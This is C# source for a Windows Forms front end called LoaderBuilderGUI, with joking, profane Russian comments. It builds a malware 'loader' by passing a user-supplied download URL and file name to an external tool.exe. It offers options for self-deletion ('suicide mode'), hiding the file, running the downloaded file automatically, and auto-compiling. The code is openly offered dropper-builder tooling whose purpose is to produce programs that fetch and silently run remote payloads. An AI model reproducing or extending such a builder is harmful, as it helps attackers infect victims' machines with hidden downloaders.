using System.Diagnostics;

namespace LoaderBuilderGUI
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private void button1_Click(object sender, EventArgs e)
        { // Основные действия бляить
            // Меньшие из зол
            string url = textBox1.Text;
            string namefile = textBox2.Text;
            // Конец меньшиго из зол
            // Вроде наибольшие (или нет) из зол
            string suicide = "No";
            string run = "No";
            string compile = "No";
            string hide = "No";
            // Вродец конец (Нет)
            if (checkBox1.Checked == true)
            { // Suicide mode Лол
                suicide = "Yes";
            }
            if (checkBox2.Checked == true)
            { // Крыса ебанная, ой тоесть хайд мод ой тьфу Hide mode
                hide = "Yes";
            }
            if (checkBox3.Checked == true)
            {  // Бегун или запускает файл при скачивании лолка
                run = "Yes";
            }
            if (checkBox4.Checked == true)
            { // Авто компилиция (пилиция блять)
                compile = "Yes";
            }
            var process = Process.Start(@"tool.exe ", namefile + " " + url + " " + compile + " " + suicide + " " + hide + " " + run);
            process.WaitForExit();
            MessageBox.Show("Файл слеплен!\nПараметры :\nСуицаид мод : " + suicide + "\nСпрятать файл : " + hide + "\nЗапустить файл : " + run + "\nАвтокомпиляция : " + compile + "\n---------------------" + "\nСсылка : " + url + "\nИмя файла : " + namefile + "\n---------------------" + "\nСделанно LoaderBuilderGUI");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Билдер LoaderBuilderGUI\nИспользованна версия : Интегрированная версия v0.3\nСозданно : Ametero(z)");
        }

    }
}
